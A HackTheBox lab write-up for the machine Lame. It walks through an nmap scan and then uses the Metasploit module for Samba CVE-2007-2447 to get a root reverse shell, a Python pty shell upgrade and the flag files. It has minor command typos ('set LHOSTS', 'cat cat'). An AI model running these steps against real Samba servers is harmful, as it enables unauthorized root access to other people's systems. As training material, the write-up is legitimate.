---
layout: post                                                                 
title: "HTB Writeup: Lame"                                     
date: 2023-03-12 09:00:00 -0500                                              
description: Lame is an easy HackTheBox machine created by ch4p. It involves exploiting a vulnerable samba server.                                            
img: htb-lame/lame-info-card.png                                                 
tags: [HackTheBox, Lame, Samba, Writeup, CVE-2007-2447]
---

Lame is an easy HackTheBox machine created by [ch4p](https://app.hackthebox.com/users/1). It involves some simple enumeration and the exploitation of a known Samba vulnerability.

# Enumeration 

To kick off this box, let's run a Nmap scan to see what services and ports are open. 

```
nmap -sC -sV 10.129.203.142 -oN top_1000
```

The scan shows that the ports for FTP (21), SSH (22), and Samba (139 & 445) are open. 

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.57
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

 smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-03-12T11:43:07-04:00
```

# Exploitation
Samba is infamously known for being chock-full of vulnerabilities. So, I'm going to start by checking for known exploits. After a quick Google search, I found that Samba 3.0.20 is vulnerable to [CVE-2007-2447](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/samba/usermap_script) A.K.A. "Samba Username Map Script Command Execution". 

This exploit is conveniently a Metasploit module. So, I will use Metasploit to carry out this attack. 

To begin, I'll type `msfconsole` into the commandline. 

From there, I'll find the module by using Metasploit's search feature:

```
msf6 > search "samba 3.0.20"

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
```

The exploit is the only one available. To get Metasploit to use this module, type `use 0` and then `show options`. 

You should get something that looks like this:

![msf options]({{site.baseurl}}/assets/img/htb-lame/msf-options.png)   

From here, I'll set the `LHOSTS` and `RHOSTS` parameters. 

- LHOST is your listening address. For most people, this will be equal to your `tun0` value (you can find this by using the `ifconfig` command). 
- RHOSTS is the machine's IP address. 

To set these values, use the following commands: 

_Note: Sub \<ip_address\> for Lame's IP address._ 

```
set RHOSTS <ip_address>
set LHOSTS tun0
```

Once those values are set, we can exploit the machine! Do this by typing `exploit` and pressing `Enter`! If all went well, you should have a root shell on the machine (A.K.A INFINITE POWER :joy:).

_Optional: To make your shell look better, use this Python one-liner:_
```
python -c 'import pty; pty.spawn("/bin/bash");'
```

From here, you can collect the user and root flags by running the following commands.

```
[User] cat cat /home/makis/user.txt
[Root] cat /root/root.txt
```

I hope you enjoyed this writeup! Happy Hacking :) 

